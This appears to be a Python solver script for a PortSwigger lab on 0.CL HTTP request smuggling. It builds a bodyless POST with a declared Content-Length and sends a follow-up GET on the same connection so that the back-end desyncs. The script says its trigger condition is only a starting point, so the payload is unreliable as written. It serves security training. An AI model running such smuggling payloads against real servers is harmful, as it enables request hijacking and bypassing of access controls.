"""
Lab 18: 0.CL request smuggling
https://portswigger.net/web-security/request-smuggling/advanced/0-cl-request-smuggling
Difficulty: Expert

📝 The mirror of Lab 17 — here the FRONT-END disregards Content-Length
under specific conditions (e.g. for a particular method/path combo) while
the back-end still honors it fully. The front-end forwards what it thinks
is a bodyless request, but the back-end reads Content-Length bytes beyond
that — consuming the start of the NEXT request the front-end sends as this
one's body instead.
"""

from utils import send_same_connection, normalize_crlf, log, note, summarize_response

HOST = "YOUR-LAB-ID.web-security-academy.net"

# A method the front-end treats as "never has a meaningful body" (varies
# by lab — often a non-standard verb, or POST with a header combo the
# front-end's logic special-cases) while Content-Length is still honored
# by the back-end.
SMUGGLE_PAYLOAD = normalize_crlf("""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

""".format(host=HOST))

# The front-end, believing the prior request had NO body, immediately
# forwards this next request — but the back-end is still expecting 44
# bytes of body from the PREVIOUS request, and consumes this request's
# start line + headers as that leftover body instead.
FOLLOWUP = normalize_crlf("""GET /404 HTTP/1.1
X-Ignore: X

""".format(host=HOST))


def run():
    note("This lab's exact trigger condition (which method/header combo makes")
    note("the FRONT-END ignore Content-Length) varies — the POST shape above")
    note("is a starting point; check the lab's hint text for the specific")
    note("quirk (e.g. a particular header value) this instance uses.")

    (r1, _), (r2, _) = send_same_connection(HOST, [SMUGGLE_PAYLOAD, FOLLOWUP])
    summarize_response(r1, "First request response")
    summarize_response(r2, "Second request response (watch for desync symptoms)")


if __name__ == "__main__":
    run()
